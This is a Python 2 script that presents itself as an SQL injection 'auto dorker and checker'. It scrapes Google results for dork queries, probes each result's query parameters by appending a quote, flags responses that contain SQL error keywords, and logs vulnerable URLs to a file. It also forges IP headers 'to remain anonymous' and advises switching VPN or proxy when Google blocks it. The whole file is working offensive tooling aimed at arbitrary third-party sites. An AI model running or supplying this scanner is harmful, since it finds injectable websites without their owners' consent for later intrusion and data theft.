#!/usr/bin/python
#Basic SQLi auto dorker and checker
#coded by Freak/SynthMesc
#Version 1.1.7
#updated for 2020
import urllib2,urllib,sys,re,random,string,time,threading,urlparse,socket
try:
    dorklist=sys.argv[1]
except:
    print "Usage: "+sys.argv[0]+" [DORK LIST]" #Simple usage for the skids out ther ^_^
    exit(1)
def randomIP():
    return '.'.join('%s'%random.randint(0, 255) for i in range(4)) #Generate random IP for false headers
def test(target,testchar):
    try:
        opener = urllib2.build_opener()
        opener.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')] #Custom user agent.
        opener.addheaders = [('CLIENT-IP',randomIP())] #Inject random IP header into multiple variables, to remain anonymous.
        opener.addheaders = [('REMOTE-ADDR',randomIP())]
        opener.addheaders = [('VIA',randomIP())]
        opener.addheaders = [('X-FORWARDED-FOR',randomIP())]
        keywords=["SQL", "Warning", "Syntax"]
        doit = 0
        if "?" not in target and "=" not in target:
            return
        parsed = urlparse.urlparse(target)

        # and parse the query string into a dictionary
        qs = urlparse.parse_qs(parsed.query, keep_blank_values=0, strict_parsing=0)

        # this makes a new dictionary, with same keys, but all values changed to "foobar"
        for i in qs:
            targettest =  target.replace(i + "=" + target.split(i)[1].split("=")[1].split("&")[0], i + "=" + target.split(i)[1].split("=")[1].split("&")[0] + "%27")
            print "[+] Trying "+targettest
            try:
                resp=opener.open(targettest,timeout=5)
            except Exception, e:
                print "[-] "+str(e)
                return
            for keyword in keywords:
                try:
                    for x in resp.read().split(" "):
                        if keyword in x:
                            print "[+] Found keyword '"+keyword+"' at "+target+testchar
                            f=open("SQLi_Vulnerable.txt","a")
                            f.write(targettest+"\r\n")
                            f.close()
                            break
                except urllib2.HTTPError as e:
                    print "[-] "+str(e)
                    pass
    except Exception as e:
        print "[-] "+str(e)
        pass
def spyder(dork,page):
    searchresults=""
    opener = urllib2.build_opener()
    opener.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')] #Custom user agent.
    opener.addheaders = [('CLIENT-IP',randomIP())] #Inject random IP header into multiple variables, to remain anonymous.
    opener.addheaders = [('REMOTE-ADDR',randomIP())]
    opener.addheaders = [('VIA',randomIP())]
    opener.addheaders = [('X-FORWARDED-FOR',randomIP())]
    opener.addheaders = [('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
    opener.addheaders = [('Accept-Language','en-US,en;q=0.5')]
    opener.addheaders = [('Accept-Encoding','gzip, deflate')]
    opener.addheaders = [('Referer',dork)]
    try:
        searchresults=opener.open(dork,timeout=5).read()
    except Exception, e:
        print "[-] "+str(e)
        print "[-] Bot has been blocked from google!!! Change VPN server or proxy! Press enter to continue"
        raw_input()
        spyder(dork, page)
    if searchresults == "":
        print "[-] "+str(e)
        print "[-] Bot has been blocked from google!!! Change VPN server or proxy! Press enter to continue"
        raw_input()
        spyder(dork, page)
    for i in re.findall('''href=["'](.[^"']+)["']''',searchresults, re.I):
        i=i.replace("amp;",'')
        if "start="+str(page)+"0" in i and i.startswith("/search"):
            dorkurl="http://www.google.com"+i
            print "[+] Searching next page "+dorkurl
            spyder(dorkurl,page)
            page+=1
        i=urllib2.unquote(i).decode('utf8')
        try:
            i=i.split("?q=")[1]
            i=i.split("&sa=")[0]
            if i.startswith("http"):
                    if 'google' in i:
                        continue
                    elif i!=dork.decode('utf8'):
                        threading.Thread(target=test, args=(i,"%27",)).start()
        except Exception as e:
#            print(str(e))
            continue
f=open(dorklist,"r")
for dork in f.read().split("\n"):
    if dork == '':
        break
    print "[+] Searching for dork: '"+dork+"'"
    spyder('http://www.google.com/search?hl=en&q='+urllib.quote_plus(dork),1)
f.close()
